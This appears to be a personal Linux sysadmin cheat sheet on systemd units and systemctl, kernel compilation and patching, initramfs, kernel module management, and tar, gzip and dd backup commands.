APPEND secure nfsdir=10.1.1.215:/cdrom nodhcp lang=us ramdisk_size=100000
init=/etc/init apm=power-off nomce vga=791 initrd=miniroot.gz quiet
BOOT_IMAGE=knoppix













■ 

chsh −−list−shells

echo $SHELL			# Default shell used

chsh -s /bin/zsh xe1phix	## 


/usr/sbin/useradd -D		## useradd - see the system default values



usermod -l 				## changes the login name of the user account.
usermod -L 				## locks the account so the user can’t login.
usermod -p 				## changes the password for the account.
usermod -U 				## unlocks the account so the user can login.





chpasswd < users.txt
































ls -l /etc/systemd/system/default.target


ls -l /lib/systemd/system/runlevel5.target



echo -e "\t<<+}================================================={+>>"
echo -e "\t\t >> NULLify NetworkManager Via Null Symlink:" 
echo -e "\t<<+}================================================={+>>"
systemctl mask NetworkManager.service

ln -s '/dev/null' '/etc/systemd/system/NetworkManager.service'


echo "________________________________________________________________________"
echo
echo -e "\t\t To Undo Just Issue This Command:"
echo -e "\t\t systemctl unmask NetworkManager.service"
echo "________________________________________________________________________"



## ========================== SystemCtl ============================ ##



## Load path when running In system mode (--system).
       ┌────────────────────┬─────────────────────────────┐
       │Path                │ Description                 │
       ├────────────────────┼─────────────────────────────┤
       │/etc/systemd/system │ Local configuration         │
       ├────────────────────┼─────────────────────────────┤
       │/run/systemd/system │ Runtime units               │
       ├────────────────────┼─────────────────────────────┤
       │/lib/systemd/system │ Units of installed packages │
       └────────────────────┴─────────────────────────────┘

/etc/systemd/system/*
/run/systemd/system/*
/lib/systemd/system/*


unit files are located at `/etc/systemd/system`




pkg-config systemd --variable=systemdsystemconfdir
/etc/systemd/system

pkg-config systemd --variable=systemdsystemunitdir
/lib/systemd/system


pkg-config systemd --variable=systemduserunitdir
/usr/lib/systemd/user

pkg-config systemd --variable=systemduserconfdir
/etc/systemd/user



       Table 2.  Load path when running In user mode (--user).
       ┌────────────────────────────────┬────────────────────────────────────────────┐
       │Path                            │ Description                                │
       ├────────────────────────────────┼────────────────────────────────────────────┤
       │$XDG_CONFIG_HOME/systemd/user   │ User configuration (only used when         │
       │                                │ $XDG_CONFIG_HOME is set)                   │
       ├────────────────────────────────┼────────────────────────────────────────────┤
       │$HOME/.config/systemd/user      │ User configuration (only used when         │
       │                                │ $XDG_CONFIG_HOME is not set)               │
       ├────────────────────────────────┼────────────────────────────────────────────┤
       │/etc/systemd/user               │ Local configuration                        │
       ├────────────────────────────────┼────────────────────────────────────────────┤
       │$XDG_RUNTIME_DIR/systemd/user   │ Runtime units (only used when              │
       │                                │ $XDG_RUNTIME_DIR is set)                   │
       ├────────────────────────────────┼────────────────────────────────────────────┤
       │/run/systemd/user               │ Runtime units                              │
       ├────────────────────────────────┼────────────────────────────────────────────┤
       │$XDG_DATA_HOME/systemd/user     │ Units of packages that have been installed │
       │                                │ In the home directory (only used when      │
       │                                │ $XDG_DATA_HOME is set)                     │
       ├────────────────────────────────┼────────────────────────────────────────────┤
       │$HOME/.local/share/systemd/user │ Units of packages that have been installed │
       │                                │ In the home directory (only used when      │
       │                                │ $XDG_DATA_HOME is not set)                 │
       ├────────────────────────────────┼────────────────────────────────────────────┤
       │/usr/lib/systemd/user           │ Units of packages that have been installed │
       │                                │ system-wide                                │
       └────────────────────────────────┴────────────────────────────────────────────┘



~/.config/systemd/user/*
/etc/systemd/user/*
$XDG_RUNTIME_DIR/systemd/user/*
/run/systemd/user/*
~/.local/share/systemd/user/*
/usr/lib/systemd/user/*


## ___________________________________________________________________________________________________##
## -------------------------------------------------------------------------------------------------- ##
##-==================================================================================================-##


   |----------------|		|-----------------------------------------------------------------------|
   | [+] Name    	|		|                             Description                               |
   |----------------|		|-----------------------------------------------------------------------|

##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=##
   |• ExecStartPre			| Commands that will run before `ExecStart`. 							|
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=##
   |• ExecStart				| Main commands to run for this unit. 									|
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=##
   |• ExecStartPost			| Commands that will run after all `ExecStart` commands have completed. |
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=##
   |• ExecReload			| Commands that will run when this unit is reloaded via 				|
   | ----------------------	| 			`systemctl reload foo.service` 								|
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=##
   |• ExecStop				| Commands that will run when this unit is considered failed or 		|
   | ----------------------	|  		if it is stopped via `systemctl stop foo.service` 				|
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=##
   |• ExecStopPost			| Commands that will run after `ExecStop` has completed. 				|
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=##
   |• RestartSec			| The amount of time to sleep before restarting a service. 				|
   | ----------------------	| prevents a failed service from restarting itself every 100ms. 		|
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=##







systemctl get-default 
systemctl set-default multi-user.target
systemctl isolate multi-user.target

systemctl list-dependencies graphical.target



systemctl isolate poweroff.target			## Shutdown Now
systemctl isolate rescue.target				# Enter single/rescue mode

																							
## ================================================================================================ ##
## ======== shows the time required to initialize the kernel, plus the time to load the =========== ## 
## ======= initial RAM disk (initrd) and the time to activate systemd units (userspace) =========== ##
## ================================================================================================ ##

systemd-analyze time



systemctl show-environment
systemctl show
systemctl status
systemctl list-jobs
systemctl is-enabled
systemctl list-sockets
systemctl list-units
systemctl list-unit-files
systemctl --all
systemctl --recursive
systemctl --show-types
systemctl --plain
systemctl list-timers
systemctl is-system-running   






strings /sbin/init | grep -i systemd
strings /sbin/init | grep -i upstart
initctl list | grep start/running


systemctl list-unit-files --type=service | grep -v disabled
systemctl list-unit-files --type=service | grep -v enabled

systemctl --list-units --all --state=inactive

systemctl list-unit-files --type=target
systemctl list-units --type=target



systemctl show --property "WantedBy" getty.target
systemctl show --property "Requires" multi-user.target

systemctl list-dependencies multi-user.target




systemctl list-dependencies sshd.service
systemctl show sshd.service -p Conflicts		## pass the -p flag with the property name



ls -al /lib/systemd/system/runlevel*.target
ls -al /etc/systemd/system/default.target

ls -l /usr/lib/systemd/system/runlevel?.target


systemctl list-units | grep .target
systemctl list-units | grep .service
systemctl list-unit-files --type=service
systemctl list-unit-files --type=target




/etc/systemd/system								## {*} which directory stores unit files?
/usr/lib/systemd/system
/lib/systemd 
/usr/share/systemd


/etc/systemd/system.conf
/etc/systemd/system.conf.d/*.conf
/run/systemd/system.conf.d/*.conf
/lib/systemd/system.conf.d/*.conf

/etc/systemd/user.conf
/etc/systemd/user.conf.d/*.conf
/run/systemd/user.conf.d/*.conf
/usr/lib/systemd/user.conf.d/*.conf





systemctl list-units --type=service --all
systemctl list-units --type=target --all
ls -l /usr/lib/systemd/system/runlevel?.target
systemctl list-dependencies graphical.target
systemctl get-default
systemctl set-default multi-user.target
ln -s '/usr/lib/systemd/system/multi-user.target' '/etc/systemd/system/default.target'

systemctl isolate multi-user.target
systemctl isolate poweroff.target
systemctl poweroff
systemctl reboot

systemd-analyze time

disable a service unit at boot and
ensure that it cannot be started anymore, you should use the mask


# systemctl mask postfix.service
ln -s '/dev/null' '/etc/systemd/system/postfix.service'



After creating the unit file it should be activated with the command:
# systemctl start mnt.mount
activate the auto mounting on startup use the command:
# systemctl enable mnt.mount






systemd.target



prints a list of all running units
systemd-analyze blame 



systemd-analyze dump


generate a graphical dependency tree.
systemd-analyze dot | dot -Tsvg > systemd.svg 



systemd-analyze plot prints an SVG graphic detailing which system services



systemd-analyze critical-chain 




Plots all dependencies of any unit whose name starts with "avahi-daemon"

           $ systemd-analyze dot 'avahi-daemon.*' | dot -Tsvg > avahi.svg


Plots the dependencies between all known target units

systemd-analyze dot --to-pattern='*.target' --from-pattern='*.target' | dot -Tsvg > targets.svg

eog targets.svg



systemd-analyze get-log-level

get-log-target


systemd-analyze set-log-level 

set-log-target


syscall-filter


systemd-analyze time







systemd-analyze time prints the time spent In the kernel before userspace has been reached



















Retrieve a PGP key

systemd-resolve --openpgp 


Retrieve a TLS key ("=tcp" and ":443" could be skipped)

systemd-resolve --tlsa=tcp fedoraproject.org:443


Resolve an SRV service

systemd-resolve --service _xmpp-server._tcp gmail.com

Retrieve the MX record of the "yahoo.com" domain

systemd-resolve -t MX yahoo.com --legend=no

Retrieve the domain of the "85.214.157.71" IP address

systemd-resolve 85.214.157.71

Retrieve the addresses of the "www.0pointer.net" domain

systemd-resolve www.0pointer.net




systemd-resolve --flush-caches
/run/systemd/resolve/resolv.conf
systemd.network


systemd-networkd.service
systemd.netdev
loginctl user-status
show-seat
loginctl list-seats
seat-status
--all
loginctl list-users
loginctl list-sessions
show-user


systemd-system.conf

RestrictNamespaces=
cgroup, ipc, net, mnt, pid, user and uts

NoNewPrivileges=yes
DefaultEnvironment=
User=
Group=.
PrivateUsers=






RestrictAddressFamilies=

When prefixed with ~ the listed address families will be applied as blacklist
RestrictAddressFamilies=~AF_INET6


SystemCallArchitectures=native


PrivateTmp=,
ReadOnlyPaths=
ReadWritePaths=


ProtectControlGroups=
MountAPIVFS=yes
/sys/fs/cgroup
CapabilityBoundingSet=

CapabilityBoundingSet=~CAP_SYS_ADMIN
SystemCallFilter=~@mount




PrivateDevices=
ProtectSystem=
ProtectHome=

list the actual list of system calls In each
           filter
systemd-analyze syscall-filter


SystemCallFilter=

ProtectKernelTunables=, 
ProtectKernelModules=
MemoryDenyWriteExecute=, or 
RestrictRealtime=


AppArmorProfile=
SELinuxContext=
PAMName=
NotifyAccess=all









UtmpMode=
UtmpIdentifier=


MountFlags=
ProtectSystem=



PrivateNetwork=
JoinsNamespaceOf=

IPAddressDeny=
IPAddressAllow=



PrivateTmp=


BindPaths=
BindReadOnlyPaths=


RootDirectory=/RootImage=










MemoryAccounting=true
MemoryMax=



LogLevel=, LogTarget=, LogColor=, LogLocation=, DumpCore=yes, CrashChangeVT=no, CrashShell=no,
       CrashReboot=no, ShowStatus=yes, DefaultStandardOutput=journal, DefaultStandardError=inherit




org.freedesktop.login1.Manager.Reboot
org.freedesktop.login1.Manager.PowerOff
org.freedesktop.systemd1.Manager.KExec
org.freedesktop.systemd1.Manager.Halt


DHCP=ipv4wq


DNSSEC=
DNSSECNegativeTrustAnchors=





ConditionKernelCommandLine=
KernelCommandLine=


ConditionVirtualization=
Virtualization=




networkctl





q
dracut






from the booted Knoppix system, rsync all of the files from the /cdrom
directory to /mnt/knoppix:


rsync –av /cdrom/ 192.168.1.5:/mnt/knoppix/



edit the /etc/exports file on the NFS server and 
add an entry to share the /mnt/knoppix directory:


/mnt/knoppix 192.168.1.0/255.255.255.0(ro)


/etc/init.d/nfsd reload






Kernel Versions





1.0-2.6.x		## gzip prior to 


2.7.x			## bzip2 since


the -rc designation is used for test releases.


1.x.y			## The Linux Version 1 Series
2.x.y			## The Linux Version 2 Series
2.6.x.y			## The Linux Version 2.6 Series
3.x.y			## The Linux Version 3 Series
4.x.y			## The Linux Version 4 Series
		## 





echo "##-=========================================-##"
echo "     [+] The version 2 series kernels			 "
echo "##-=========================================-##"

echo "## -------------------------------------------------------- ##"
echo "	 	| Testing Releases		| odd numbered releases			"
echo "## -------------------------------------------------------- ##"
echo "	 	| Production Releases   | even numbered releases 		"
echo "## -------------------------------------------------------- ##"




echo "##-======================================================-##"
echo "    					 [+] 2.6.x.y						  "
echo "##-======================================================-##"
echo "## ------------------------------------------------------ ##"
echo "	   |  Major Release 		|  3rd number (the x)	|	  "
echo "## ------------------------------------------------------ ##"
echo "	   |  Incremental Patch 	|  4th number (the y)	|	  "
echo "## ------------------------------------------------------ ##"







echo "##-======================================================-##"
echo "    [?] The 2.6 version were all production releases"
echo "##-======================================================-##"

echo "##-==================================================================================================-##"
echo "    [?] Development releases appended a -rc after the kernel version. "
echo "##-==================================================================================================-##"
echo "    [?] When a release was deemed Stable for Production, the -rc was removed."
echo "##-==================================================================================================-##"



The most recent production version of the kernel is labeled $stable. 
Previous versions of the kernel are labeled $longterm, 
while the most recent development version is labeled $mainline.




• zImage (max 512 Kb)
• bzImage (no size limit)
• bzImage (stands for "big zImage")






## ================================================================================================= ##
## 											Make targets
## ================================================================================================= ##

## ------------------------------------------------------------------------------------------------- ##
• make config					## The most involved type, you will be asked questions on everything
								## before compile can start (100s of them), not generally used anymore 
								## except In very specialized circumstances
## ------------------------------------------------------------------------------------------------- ##
• make menuconfig				## Most common method, will read .config file In base source
								## directory as template if it exists, reads existing kernel configuration if not
## ------------------------------------------------------------------------------------------------- ##
• make xconfig					## Same as make menuconfig but with the X Window QT graphical libraries
## ------------------------------------------------------------------------------------------------- ##
• make gconfig					## Same as make menuconfig but with the Gnome Desktop and GTK+ librarie
## ------------------------------------------------------------------------------------------------- ##
• make clean					## Delete most generated files while leaving enough to build modules
## ------------------------------------------------------------------------------------------------- ##
• make mrproper					## Delete all generated files and kernel configuration
## ------------------------------------------------------------------------------------------------- ##
• make distclean				## Delete temporary files, patch leftover files, and similar
## ------------------------------------------------------------------------------------------------- ##
• make config					## Terminal-based (options must be set In sequence)
## ------------------------------------------------------------------------------------------------- ##
• make menuconfig				## ncurses UI
## ------------------------------------------------------------------------------------------------- ##
• make oldconfig				## Create a new config file, based on the options In the old config
## ------------------------------------------------------------------------------------------------- ##
• make bzImage					## Compile the new kernel:
## ------------------------------------------------------------------------------------------------- ##
• make modules					## Create the module object library files using the modules target
## ------------------------------------------------------------------------------------------------- ##
• make zImage					## 
## ------------------------------------------------------------------------------------------------- ##
• make -j2 all					## speed up compilation by allocating 2 simultaneous compile jobs
## ------------------------------------------------------------------------------------------------- ##
• make modules_install			## Install the previously built modules present In
								## /lib/modules/X.Y.Z
## ------------------------------------------------------------------------------------------------- ##
• make install					## Install the kernel automatically
## ------------------------------------------------------------------------------------------------- ##
• make silentoldconfig			## Similar to oldconfig but reduces screen clutter.
## ------------------------------------------------------------------------------------------------- ##
• make allmodconfig				## Creates a configuration file that uses modular configuration as much as possible.
## ------------------------------------------------------------------------------------------------- ##




## ================================================================================================= ##
• make rpm-pkg 				## Build source and binary RPM packages
## ------------------------------------------------------------------------------------------------- ##
• make binrpm-pkg 			## Build binary RPM package
## ------------------------------------------------------------------------------------------------- ##
• make deb-pkg 				## Builds binary DEB package
## ================================================================================================= ##



## ================================================================================================= ##
make-kpkg --jobs=${NUM_CORES} --initrd --revision=${REVISION} kernel_image kernel_headers &> /dev/null
## ================================================================================================= ##



## ================================================================================================= ##
make | grep - iw “ error “		## 
## ================================================================================================= ##



## ================================================================================================= ##
/usr/src/linux/scripts/patch-kernel linux

patch -p1 < file.patch 			## Apply the patch
## ------------------------------------------------------------------------------------------------- ##
patch -Rp1 < file.patch 		## remove a patch
## ================================================================================================= ##



## ================================================================================================= ##
gzip -cd ../patch- version .gz | patch -p1
## ------------------------------------------------------------------------------------------------- ##
bzip2 -dc ../patch- version .bz2 | patch -p1
## ================================================================================================= ##


discover a large uncompressed files true size:
zcat file.gz | wc -c


recompress concatenated files to get better compression, do:

gzip -cd old.gz | gzip > new.gz


## Copy (with permissions) copy/ dir to /where/to/ dir ##
$ ( tar -c /dir/to/copy ) | ( cd /where/to/ && tar -x -p )


## Make compressed archive of dir/ ##
$ tar -c dir/ | bzip2 > dir.tar.bz2



echo "##########################################################"
## Make encrypted archive of dir/ on remote machine ##
echo "##########################################################"
tar -c dir/ | gzip | gpg -c | ssh user@remote 'dd of=dir.tar.gz.gpg'

tar -c /usr/share/initramfs-tools/ | gzip | gpg -c | dd of=/home/poozer/initramfs.tar.gz.gpg

tar -c dir/ | gzip | gpg -c | dd of=/home/poozer/file.tar.gz.gpg


## Backup harddisk to remote machine ##
$ dd bs=1M if=/dev/sda | gzip | ssh user@remote 'dd of=sda.gz'


Full Backup A full backup is a copy of all data

incremental backup makes a copy of only data that has
been modified since the last backup operation
a file’s modified time stamp is compared to the last backup type’s
time stamp.


differential backup makes a copy of all data that has
changed since the last full backup.

snapshot backup is considered a hybrid approach
uses pointers, such
as hard links, to create a reference table linking the backup data with the original
data. The next time you make a backup, instead of a full backup the backup
software performs an incremental backup (only modified or new files are copied
to the backup media), and the software copies and updates the pointer reference
table.















full backup is one where all data is
copied to another medium

incremental backup copies only the data that has
been modified or added since the last backup.

differential backup - only data that has been modified or
added since the last full backup is copied.

snapshots, a full backup is madeand a pointer reference table is created. After that, an incremental backup is done
along with the pointer reference table, which is copied and updated


[?] The tar .snar file extension - contains metadata used to create full incredmental backups

[?] The snapshot file uses file timestamps - so tar can determine 
	if a file has been modified since it was last backed up


tar -g Archive1.snar -Jcvf 





tar -g Xe1phixGithub.snar -Jcvf Xe1phixGithub.tar.xz /run/media/public/2TB/Xe1phixGithub/*








Sparse files contain “holes” where
a sequence of zeros is known to exist.





the file size and the MD5 hash are also identical. However, notice
how the block size used on the filesystem is very different (7733252 blocks
versus 2600 blocks):

ls -ls image.raw sparse-image.raw
## --------------------------------------------------- ##
## 7733252 -rw-r----- 1 root root 7918845952 May 15 08:28 image.raw
## 2600 -rw-r----- 1 root root 7918845952 May 15 08:30 sparse-image.raw
## --------------------------------------------------- ##


md5sum image.raw sparse-image.raw
## --------------------------------------------------- ##
## 325383b1b51754def26c2c29bcd049ae image.raw
## 325383b1b51754def26c2c29bcd049ae sparse-image.raw
## --------------------------------------------------- ##






















## Create cdrom image from contents of dir ##
$ mkisofs -V LABEL -r dir | gzip > cdrom.iso.gz


Read data from stdin and output the compressed data to stdout as follows:

cat file | gzip -c > file.gz







-t7z   7z archive

       -m0=lzma
              lzma method

       -mx=9  level of compression = 9 (Ultra)










KernelVersion='dpkg -l | grep linux-image | grep -v meta | sort -t '.' -k 2 -g | tail -n 1 | grep "$(uname -r)" | cut -c5-34'


Copy the new bzImage to the /boot directory:
cp /usr/src/linux-[kernel version]/arch/[architecture]/boot/bzImage /
boot/vmlinuz-[kernel version].[architecture]




## ------------------------------------------------------------------------------------------------- ##
/boot/initrd.img-*					# Installed initramfs images
## ------------------------------------------------------------------------------------------------- ##
/boot/vmlinuz-* | /boot/vmlinux-*	# Installed kernel images
## ------------------------------------------------------------------------------------------------- ##
/etc/kernel-img.conf                # Configuration  file  specifying whether and where to create symlinks
## ------------------------------------------------------------------------------------------------- ##
/initrd.img							# Symlink to the initramfs image for the primary default version
## ------------------------------------------------------------------------------------------------- ##
/initrd.img.old						# Symlink  to  the  initramfs image for the secondary default
## ------------------------------------------------------------------------------------------------- ##
/vmlinuz | /vmlinux              	# Symlink to the kernel image for the primary default version
## ------------------------------------------------------------------------------------------------- ##
/vmlinuz.old | /vmlinux.old			# Symlink to the kernel image for the secondary default  version
## ------------------------------------------------------------------------------------------------- ##



## List initramfs content of current running kernel:

lsinitramfs -l /boot/initrd.img-3.16.7-parrot-amd64 > /home/poozer/lsinitramfs.initrd.txt
## ------------------------------------------------------------------------------------------------- ##
lsinitramfs /boot/initrd.img-$(uname -r) >> $TEMP_DIR/lsinitramfs.initrd.txt
## ------------------------------------------------------------------------------------------------- ##
lsinitramfs /boot/initrd.img-$(uname -r)
## ------------------------------------------------------------------------------------------------- ##

lsinitramfs -l /boot/initrd.img-$(uname -r) >> 


/etc/initramfs-tools/update-initramfs.conf
## ------------------------------------------------------------------------------------------------- ##
update-initramfs -u			# Update the initramfs of the  newest kernel:
## ------------------------------------------------------------------------------------------------- ##
update-initramfs -c -k 2.6.18-1-686
## ------------------------------------------------------------------------------------------------- ##
/etc/initramfs-tools/initramfs.conf
## ------------------------------------------------------------------------------------------------- ##
/etc/initramfs-tools/modules
## ------------------------------------------------------------------------------------------------- ##
/etc/initramfs-tools/conf.d
## ------------------------------------------------------------------------------------------------- ##
/etc/initramfs-tools/DSDT.aml
              If this file exists, it will be appended to  the  initramfs
              In a way that causes it to be loaded by ACPI.


Create an initramfs for current running kernel:
mkinitramfs -o ~/tmp/initramfs-$(uname -r)

Create an initramfs for specific kernel and keep builddirs:
mkinitramfs -k -o ~/tmp/initramfs-2.6.21-686 2.6.21-686

Debug initramfs creation (check out written logfile)
sh -x mkinitramfs -o ~/tmp/initramfs-$(uname -r) 2> ~/tmp/log



Create the initramfs file (which calls the "dracut" utility):
mkinitrd /boot/initramfs-[kernel version].[architecture].img [kernel version]


mkinitrd /boot/initramfs-3.13.0-36.x86_64.img 3.13.0-36




The modules that the kernel will load at boot time are listed in the /etc/modules
file in Debian systems

/etc/modules-load.d
folder for Red Hat–based systems.


The kernel module configurations are stored in
/etc/conf.modules


the modules required to support a kernel are stored in
the /lib/modules folder





/proc/modules


If the module controls its own unloading via a “can_unload”
routine, then the user count displayed by lsmod is always -1



insmod -s Write results to syslog instead of the terminal



## Issue the command lsmod to verify that the modules have indeed been removed from the running kernel.
rmmod snd_ac97_codec
# echo $?



Modules can be inserted with optional symbol=value parameters such as irq=5 or dma=3
Such parameters can be specified
on the command line or by specifying them in the module configuration file,







C OMMONLY USED DIRECTIVES IN /etc/modules.conf:

keep The keep directive, when found before any path directives, 
causes the default paths to be retained and added to any paths specified.

depfile=<full_path> 			## This directive overrides the default location for the modules 
								## dependency file, modules.dep which will be described in the next section.

path=<path> 					## This directive specifies an additional directory to search for modules.

options <modulename> 			## module-specific-options Options for modules can be specified using the options configuration line in
								## modules.conf or on the modprobe command line. The command line overrides configurations in the file. modulename
								## is the name of a single module file without the .ko extension. Module-specific op

alias <aliasname> 					## result Aliases can be used to associate a generic name with a specific module, for example:

alias /dev/ppp ppp_generic
alias char-major-108 ppp_generic
alias tty-ldisc-3 ppp_async
alias tty-ldisc-14 ppp_synctty
alias ppp-compress-21 bsd_comp
alias ppp-compress-24 ppp_deflate
alias ppp-compress-26 ppp_deflate











pre-install <module> <command> 		## This directive causes a specified shell command to be executed prior to the insertion of a
									module. For example, PCMCIA services need to be started prior to installing the pcmcia_core module:

pre-install pcmcia_core /etc/init.d/pcmcia start

install <module> <command> 			## This directive allows a specific shell command to override the default module-insertion command.

post-install <module <command> 		## This directive causes a specified shell command to be executed after insertion of the module.

pre-remove <module> <command> 		This directive causes a specified shell command to be executed prior to removal of module.
remove <module> <command> 			This directive allows a specific shell command to override the default module-removal command.
post-remove <module> <command> 		This directive causes a specified shell command to be executed after removal of module.








modinfo usbcore

parm:           authorized_default:Default USB device authorization: 0 is not authorized, 1 is authorized, -1 is authorized except for wireless USB (default, old behaviour (int)

























LKM
• Modules that are loaded into memory as needed to supplement the functionality of the base
kernel

kerneld (daemon) and kmod (kernel thread) facilitate the dynamic loading of kernel modules.

/lib/modules/X.Y.Z/*.ko						## Kernel modules for kernel version X.Y.Z
/lib/modules/X.Y.Z/modules.dep
## ------------------------------------------------------------------------------------------------- ##
/usr/src/linux/.config						## Kernel configuration file
## ------------------------------------------------------------------------------------------------- ##


Module configuration is handled in the file 
/etc/modules.conf


System.map - contains pointers to functions In the kernel 
			 and is used for debugging kernel problems.


cp System.map /boot/System.map-*
rm /boot/System.map
ln -s /boot/System.map-* /boot/System.map



/usr/lib/depmod.d/*.conf
/etc/depmod.d/*.conf
/run/depmod.d/*.conf




When you use the modules_install target to install the modules, it calls the
depmod utility, which determines the module dependencies and generates the
modules.dep file automatically.



depmod is called to generate a modules.dep file for the new kernel modules.



depmod -v --errsyms




Dynamic Kernel Module Support (DKMS)

used for building kernel modules outside the kernel source tree.


dkms program monitors the kernel version and automatically
runs scripts to recompile and install modules when the kernel version changes.



cd /lib/modules/`uname -r`
ls -l mod*

ls -lrt /lib/modules | tail -n 3




Reset all sysctl settings

systemctl restart systemd-sysctl


Update coredump handler configuration according to a specific file

/lib/systemd/systemd-sysctl 50-coredump.conf





modprobe -iv		## install modules based on the module name 
					## and not have to list the full module filename:


modprobe -rv		# invokes the rmmod






grep -v '^\#' /etc/sysctl.conf | grep -q keycodes 
grep -w init_task /boot/System.map-3.2.0-4-686-pae

modprobe -v --show vfat
lsmod | grep fat
modprobe -v vfat

modinfo -c -w | grep -v "UNLOADED" | grep LOADED | awk '{ print $3 }' | sort
kldstat | grep -v 'Name' | tr -s ' ' | cut -d ' ' -f6

lsmod | awk '{ if ($1!="Module") print $1 }' | sort
lsmod -a -f /proc/modules | grep -v "^Module" | wc -l | tr -s ' ' | tr -d ' '




man -k tomoyo | gawk -F ' ' '{ print $1 }'




Module files may be distributed either as source code that needs to be compiled
                                    or 
as binary object files on the Linux system that are ready to be
    dynamically linked to the main kernel binary program.

If the module files are distributed as source code files, 
you must compile them to create the binary object file. 
The .ko file extension is used to identify the module object files.

header files tell the C compiler what library files 
are required to compile the kernel source code.



CC Lines			## Indicate Object Code files that are being created
LD Lines			## indicate Object Code files that are being linked to create executable files



mkinitrd /boot/initrd-2.6.35.4.img 2.6.35.4
mkinitramfs -o /boot/initramfs-2.6.35.4.img 2.6.35.4









## Manually install the kernel binary file by copying the bzImage to the /boot dir
cp /usr/src/linux/arch/x86/boot/bzImage /boot/vmlinuz-*



## 
cp /usr/src/linux/System.map /boot/System.map-*


Copy the new compiled kernel and other files into the boot partition
## ------------------------------------------------------------------------------------------------- ##
cp /usr/src/linux/arch/boot/bzImage /boot/vmlinuz-X.Y.Z (kernel)
## ------------------------------------------------------------------------------------------------- ##
cp /usr/src/linux/arch/boot/System.map-X.Y.Z /boot
## ------------------------------------------------------------------------------------------------- ##
cp /usr/src/linux/arch/boot/config-X.Y.Z /boot
## ------------------------------------------------------------------------------------------------- ##



depmod -a			## Probe all modules In the kernel modules directory and generate the file that lists their dependencies



modprobe -a			## Insert all modules
modprobe -t			## directory Attempt to load all modules contained In the directory
modprobe -c			## module Display module configuration
modprobe -l			## List loaded modules



modules.dep needs to be (re)created each time the system is booted.


modprobe uses modules.dep to determine the order In which 
modules are to be loaded into or unloaded from the kernel.





## ================================================================================================= ##
/lib/modules/modules.dep.bin	## binary file generated by depmod listing the dependencies for every module
/lib/modules/modules.dep		## Text Version
## ================================================================================================= ##






echo "Dump The Kernels Module Configuration:"
modprobe --verbose --syslog --showconfig > modprobe.conf.txt && cat -vET modprobe.conf.txt

modprobe --verbose--show-depends --syslog > modprobe.dep.txt && cat -vET modprobe.dep.txt
modprobe --verbose--resolve-alias --syslog > modprobe.alias.txt && cat -vET modprobe.alias.txt

modinfo -a -d -l -p -n             author, description, license.  parm and filename
modinfo -k --field
modprobe --showconfig




gzip -cd /proc/config.gz > /usr/src/linux/.config
make -C /usr/src/linux modules_prepare




/proc/config.gz 									## only if configured with CONFIG_IKCONFIG_PROC
cat /lib/modules/$(uname -r)/build/.config

/usr/lib/modprobe.d/*.conf
/etc/modprobe.d/*.conf
/run/modprobe.d/*.conf

/proc/*/wchan
/boot/System.map-$(uname -r)
/boot/System.map							##  System map (kernel symbol table) 
/lib/modules/$(uname -r)/System.map
/usr/src/linux/System.map
/System.map





kerneld and kmod both facilitate dynamic loading of kernel modules.

kerneld is a daemon, 
The communication with kerneld is done through System V IPC.


kmod is a thread in the kernel itself. 
kmod operates directly from the kernel 
and does not use System V IPC








modprobe -v --show vfat
lsmod | grep fat
modprobe -v vfat

ls -l mod*
cat /etc/modules.conf



ls -lrt /lib/modules | tail -n 3
ls -lrt /boot | tail -n 6

head -n 6 Makefile

cd /lib/modules/`uname -r`
ls -l mod*





## ================================================================================================= ##
/etc/ld.so.cache				## Cache file
/etc/ld.so.conf					## Configuration file used to specify other shared library locations
## ================================================================================================= ##




/etc/default/grub

/etc/grub.d/
40_custom

update - grub
grub - mkconfig




echo "show kernel runtime parameters:"
cat /proc/cmdline | xxd 



set check_signatures="enforce"











**** MEMORY LAYOUT

The traditional memory map for the kernel loader, used for Image or
zImage kernels, typically looks like:

	|			 |
0A0000	+------------------------+
	|  Reserved for BIOS	 |	Do not use.  Reserved for BIOS EBDA.
09A000	+------------------------+
	|  Command line		 |
	|  Stack/heap		 |	For use by the kernel real-mode code.
098000	+------------------------+	
	|  Kernel setup		 |	The kernel real-mode code.
090200	+------------------------+
	|  Kernel boot sector	 |	The kernel legacy boot sector.
090000	+------------------------+
	|  Protected-mode kernel |	The bulk of the kernel image.
010000	+------------------------+
	|  Boot loader		 |	<- Boot sector entry point 0000:7C00
001000	+------------------------+
	|  Reserved for MBR/BIOS |
000800	+------------------------+
	|  Typically used by MBR |
000600	+------------------------+ 
	|  BIOS use only	 |
000000	+------------------------+


When using bzImage, the protected-mode kernel was relocated to
0x100000 ("high memory"), and the kernel real-mode block (boot sector,
setup, and stack/heap) was made relocatable to any address between
0x10000 and end of low memory



















########################################################
			Boot Time Kernal Modifications: 
########################################################


################################################################################################################
fstab 					Mount Description Options
################################################################################################################
auto 					File system will be mounted automatically at boot time.
noauto 					File system will not be mounted automatically at boot time.
dev 					Allows interpretation of block or character special devices on this file system.
nodev 					Does not interpret block or character special devices on this file system.
exec 					Execution of binaries is allowed on this file system.
noexec 					Execution of binaries is NOT allowed on this file system.
